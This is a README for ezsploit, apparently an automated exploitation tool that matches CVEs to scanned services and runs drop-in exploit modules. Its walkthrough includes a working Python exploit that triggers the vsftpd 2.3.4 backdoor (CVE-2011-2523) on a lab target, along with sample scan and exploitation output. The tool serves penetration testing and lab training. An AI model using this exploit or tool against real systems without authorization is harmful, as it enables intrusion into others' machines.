ezsploit

ezsploit is an automated exploitation tool that takes CVE IDs, fetches vulnerability details, scans a target for relevant services, and attempts to exploit them using modular exploit scripts. It’s designed to be simple and interactive – perfect for CTFs, labs, or authorized penetration tests.

Features

· 📡 CVE Information Retrieval – Pulls descriptions, CVSS scores, and affected products/versions from CIRCL and (optionally) NVD.
· 🔍 Intelligent Port Scanning – Automatically determines which ports to scan based on affected products. You can also override ports manually for any CVE.
· 🧠 Banner Grabbing & Service Fingerprinting – Identifies service names and versions using probes and regex patterns.
· ✅ Vulnerability Matching – Compares scanned services with affected product lists to highlight likely vulnerable targets.
· 🧩 Modular Exploit Execution – Loads exploit scripts from the CVE/ folder. Just drop a Python file with an exploit(ip, port) function.
· 🎮 Interactive Menu – Step‑by‑step workflow: set target, scan, exploit, review results.
· ✏️ Manual Override – If CVE details lack product/port info, you can manually specify them.

Requirements

· Python 3.6+
· (Optional) requests library – for NVD fallback:
```
    pip install requests
```
· Network access to your target and the CVE APIs (CIRCL, NVD)

Installation

```
git clone https://github.com/digital-playground/ezsploit/
```

That’s it! No other dependencies.

Usage

Run the script:

```bash
python3 ezsploit.py
```

You’ll see a simple menu:

```
=== ezsploit Menu ===
1. Set Target & CVEs
2. Scan Target
3. Attempt Exploitation
4. Show Results
5. Exit
```

Menu Options Explained

1. Set Target & CVEs – Enter the target IP/hostname and one or more CVE IDs (comma‑separated). The tool fetches details for each CVE. If product info is missing, you’ll be prompted to enter a service name and port manually.
2. Scan Target – Scans the derived (or manually specified) ports. It shows open ports, banners, and service versions. Then it tries to match CVEs to services – you may be asked to confirm matches.
3. Attempt Exploitation – For each matched CVE, it looks for a corresponding exploit script in CVE/<CVE_ID>.py. If the script doesn’t exist, you can create it on the spot (your default editor will open).
4. Show Results – Displays a summary of exploitation attempts.
5. Exit – Quits the tool.

---

Example Walkthrough

Let’s walk through a real‑world example: exploiting the vsftpd 2.3.4 backdoor (CVE‑2011‑2523) on a target like Metasploitable 2.

Step 1: Start ezsploit

```bash
python3 ezsploit.py
```

Step 2: Set Target and CVE

```
=== ezsploit Menu ===
1. Set Target & CVEs
2. Scan Target
3. Attempt Exploitation
4. Show Results
5. Exit
Choice: 1

Enter target IP/hostname: 192.168.1.100
[+] Resolved to IP: 192.168.1.100

Enter CVE(s) (comma separated): CVE-2011-2523

[*] Fetching CVE details...
  CVE-2011-2523: vsftpd 2.3.4 downloaded between ... (CVSS: 7.5)
      Affected: vsftpd 2.3.4
  Do you want to override the port for CVE-2011-2523? (y/n): n
```

Here we didn’t override because the tool already knows vsftpd usually runs on port 21.

Step 3: Scan the Target

```
Choice: 2

[*] Derived ports from CVEs: [21]
[*] Scanning target...
[+] Found 1 open services:
    Port 21: vsftpd 2.3.4
[+] CVE-2011-2523 matches vsftpd on port 21 (version 2.3.4)
```

The tool automatically matched the CVE to the open service.

Step 4: Attempt Exploitation

```
Choice: 3

[*] Attempting exploitation of CVE-2011-2523 on 192.168.1.100:21 (vsftpd)
[-] No exploit script found for CVE-2011-2523 in CVE/ directory.
Would you like to create it now? (y/n): y
[*] Opening editor for CVE/CVE-2011-2523.py. Paste your exploit code, save, and exit.
```

Now your text editor opens. Write a simple exploit script:

```python
# CVE-2011-2523.py
import socket
import time

def exploit(ip, port):
    try:
        # Connect and trigger backdoor
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        s.send(b"USER letmein:)\r\n")
        s.send(b"PASS anything\r\n")
        time.sleep(1)
        # Try connecting to backdoor port 6200
        s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s2.settimeout(5)
        result = s2.connect_ex((ip, 6200))
        if result == 0:
            print("[+] Backdoor port 6200 open – you can now connect with netcat.")
            return True
        else:
            return False
    except Exception:
        return False
```

Save and exit the editor. The tool will reload the module automatically:

```
[+] Exploit module loaded successfully.
[+] CVE-2011-2523 exploitation SUCCEEDED
```

Step 5: Show Results

```
Choice: 4

=== Exploitation Results ===
CVE-2011-2523: SUCCESS - Exploit succeeded
```

That’s it! You’ve successfully exploited a vulnerability with ezsploit.

---

Adding Exploit Modules

Place your exploit scripts in the CVE/ folder, named exactly like the CVE ID (e.g., CVE-2024-1234.py). Each script must contain a function:

```python
def exploit(ip: str, port: int) -> bool:
    # Your exploit code here
    # Return True if successful, False otherwise
```

You can include any imports or helper functions. The script is loaded dynamically when you attempt exploitation.

Example skeleton:

```python
import socket

def exploit(ip, port):
    try:
        # ... exploit logic ...
        return True
    except Exception:
        return False
```

Notes

· API Rate Limiting – A small delay (CIRCL_DELAY) is added between requests to CIRCL to be respectful.
    For NVD, you can set the environment variable NVD_API_KEY to use your own API key (increases rate limits).
· Port Mapping – The tool has a built‑in map of common service names to typical ports (e.g., vsftpd → 21, ssh → 22). You can extend this by editing the SERVICE_PORT_MAP dictionary in the source.
· Banner Probes – Custom probes for different ports are defined in PROBES. Feel free to add more.
· Service Fingerprinting – Simple regex patterns are used. For better accuracy, enhance the SERVICE_FINGERPRINTS list.

Disclaimer

ezsploit is intended for authorized security testing and educational purposes only.
Unauthorized use against systems you do not own or have explicit permission to test is illegal.
The authors assume no liability for misuse or damage caused by this tool.

License

MIT – feel free to use, modify, and distribute.
